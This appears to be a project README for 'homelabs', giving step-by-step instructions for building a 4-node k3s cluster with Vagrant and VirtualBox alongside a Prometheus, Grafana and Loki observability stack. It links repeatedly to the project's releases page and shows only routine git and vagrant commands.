# 🌟 homelabs - Easy Setup for Your Kubernetes Learning

## 📥 Download the Latest Release
[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/brandonjh5937/homelabs/releases)

## 🚀 Getting Started
Welcome to homelabs! This guide will help you set up a powerful 4-node k3s cluster on your computer using Vagrant and VirtualBox. You will have everything you need for learning and testing Kubernetes with a complete observability stack including Prometheus, Grafana, and Loki.

### 📋 System Requirements
Before you start, ensure your system meets the following requirements:
- **Operating System:** Windows, macOS, or Linux
- **Virtualization Software:** VirtualBox (latest version)
- **Vagrant:** Ensure you have Vagrant installed (latest version)
- **RAM:** Minimum of 8GB for smooth performance
- **Disk Space:** At least 20GB available for VMs

## 📂 What is Included
The homelabs repository provides:
- A 4-node k3s cluster using Vagrant
- Complete observability stack with:
  - **Prometheus:** For metrics collection and monitoring
  - **Grafana:** For visualization of your data
  - **Loki:** For log aggregation and querying
- Terraform scripts for Infrastructure as Code (IaC)
- Support for multi-domain static sites
- NFS shared storage for easy access
- Cloudflare Tunnel for secure remote access

## 💻 Installation Steps
Follow these steps to get started with your homelabs setup:

1. **Download Vagrant and VirtualBox:**
   If you don’t have Vagrant or VirtualBox installed, download and install them from the official websites. Ensure you have the latest versions.

2. **Visit the Releases Page to Download:**
   Go to our [Releases page](https://github.com/brandonjh5937/homelabs/releases) to download the latest version of the software.

3. **Clone the Repository or Download ZIP:**
   You can either clone the repository or download it as a ZIP file.
   - To clone, run this command in your terminal:
     ```bash
     git clone https://github.com/brandonjh5937/homelabs.git
     ```
   - To download the ZIP file, click on the green "Code" button and select "Download ZIP."

4. **Unzip the Downloaded File:**
   If you downloaded the ZIP, unzip it to a folder on your machine. Make sure you locate this folder as you will need it.

5. **Navigate to the Project Directory:**
   Open your terminal or command prompt and change your directory to the folder where you unzipped or cloned the repository.
   ```bash
   cd path/to/homelabs
   ```

6. **Start the Vagrant Environment:**
   Run the following command to start the Vagrant environment. This will create and configure your virtual machines.
   ```bash
   vagrant up
   ```

7. **Access Your Services:**
   Once Vagrant finishes setting up, you can access the services. Open your web browser and enter:
   - **Grafana:** `http://localhost:3000`
   - **Prometheus:** `http://localhost:9090`
   - **Loki:** `http://localhost:3100`
   
   Use the default credentials (if applicable) to log in.

## 🔍 Configuration Tips
After installation, you may want to customize some settings. Here are a few tips:
- **Edit Vagrantfile:** You can edit the Vagrantfile to adjust the number of nodes or allocate more resources.
- **Configure Grafana:** Set up your data sources and dashboards according to your needs.
- **Use Terraform:** Modify the Terraform scripts to manage your infrastructure easily.

## 📦 Download & Install
For quick access, you can download the latest release directly from the Releases page by clicking [here](https://github.com/brandonjh5937/homelabs/releases).

## 📖 Documentation and Support
For more detailed documentation, visit the Wiki section of this repository. You can find:
- Guides on how to use each observability tool
- Troubleshooting tips
- Community support links

## 🔗 Related Topics
This project covers various topics which can enhance your learning:
- **Debian:** Operating system commonly used for servers.
- **Kubernetes:** A system for automating deployment and management of containerized applications.
- **Observability:** Tools and practices that allow you to monitor and understand your applications.

## 🛠️ Frequently Asked Questions
**Q: Can I run this on Windows?**  
A: Yes, both Vagrant and VirtualBox support Windows.

**Q: Do I need to know how to code?**  
A: No, this guide is designed for users without programming knowledge.

**Q: How do I stop the Vagrant machines?**  
A: Simply run:
```bash
vagrant halt
```

## 🤝 Contributing
If you would like to contribute, feel free to submit pull requests or open issues to discuss improvements. Your feedback is valuable and helps enhance this project for everyone.

## 📫 Contact
For any inquiries or additional support, please reach out through the Issues section in this repository or via direct email.

### 🌐 Visit the Releases Page to Download
Don't forget to download the latest version from our [Releases page](https://github.com/brandonjh5937/homelabs/releases).